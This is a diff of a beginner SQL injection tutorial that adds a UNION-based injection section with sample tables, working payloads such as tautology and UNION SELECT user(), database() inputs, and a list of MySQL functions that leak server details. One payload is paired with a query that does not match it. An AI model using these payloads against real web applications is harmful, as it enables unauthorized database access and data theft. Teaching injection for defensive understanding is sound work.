@@ -2,8 +2,8 @@
 --- SQL Injection Basics ---
 
 • How do SQL injection attacks work
-• Basic SQL Injection example
-• 
+• Basic SQL Injection Examples
+• SQL Injection using UNION
 • 
 • 
 • 
@@ -32,7 +32,7 @@ This result set is then processed by the web server and the result is displayed 
 The attacker has successfully performed an SQL injection attack and retrieved more information from the database than the web application designers intended with this functionality. 
 
 
--- Basic SQL Injection Example --
+-- Basic SQL Injection Examples --
 
 $userid = $_GET['UserID'];
 SQL = "SELECT * FROM Users WHERE UserID = $userid";
@@ -84,16 +84,67 @@ SELECT first_name, last_name FROM users WHERE user_id = '1';
 0' or '0'='0
 SELECT first_name, last_name FROM users WHERE user_id = '0' or '0'='0';
 
-***************************************************************************************************
 
+-- SQL Injection using UNION --
 
+The UNION operator in SQL is used to combine two or more result sets from SELECT statements. To use the UNION operator the query has to meet certain requirements:
 
+• Each select statement within UNION must have the same number of columns.
+• The columns must have similar or compatible data types.
+• The columns in each SELECT statement must be in the same order.
 
+Users table with all the user accounts:
 
++----------+----------+--------+
+| username | password | userid |
++----------+----------+--------+
+| user01   | user01   | u0001  |
+| user02   | user02   | u0002  |
++----------+----------+--------+
 
+Administrators table with all the administrator accounts:
 
++----------+----------+--------+
+| username | password | userid |
++----------+----------+--------+
+| admin01  | admin01  | a0001  |
+| admin02  | admin02  | a0002  |
++----------+----------+--------+
 
+Both tables contain exactly the same fields: username, password and userid. If we want to combine both tables in one result set, we can use the UNION operator: 
 
+SELECT * from Users UNION SELECT * from Administrators;
+
++----------+----------+--------+
+| username | password | userid |
++----------+----------+--------+
+| user01   | user01   | u0001  |
+| user02   | user02   | u0002  |
+| admin01  | admin01  | a0001  |
+| admin02  | admin02  | a0002  |
++----------+----------+--------+
+
+But what if one of the tables, let’s say the Users table, contained an additional field? In this case the SQL server would throw an error because the number of columns in each table would not match.
+
+0' or 1=1 UNION SELECT null, version() #
+SELECT username, password, userid from Users UNION SELECT username, password, userid from Administrators;
+
+0' or 1=1 UNION SELECT user(), database() #
+SELECT first_name, last_name FROM users WHERE user_id = '0' or 1=1 UNION SELECT user(), database() #;
+
+We can also use one or more of the following functions to retrieve information about the database, SQL server and tables:
+
+• @@hostname : Current Hostname
+• @@tmpdir : Tept Directory
+• @@datadir : Data Directory
+• @@version : Version of DB
+• @@basedir : Base Directory
+• user() : Current User
+• database() : Current Database
+• version() : Version
+• schema() : current Database
+• UUID() : System UUID key
+• current_user() : Current User
 
 
 
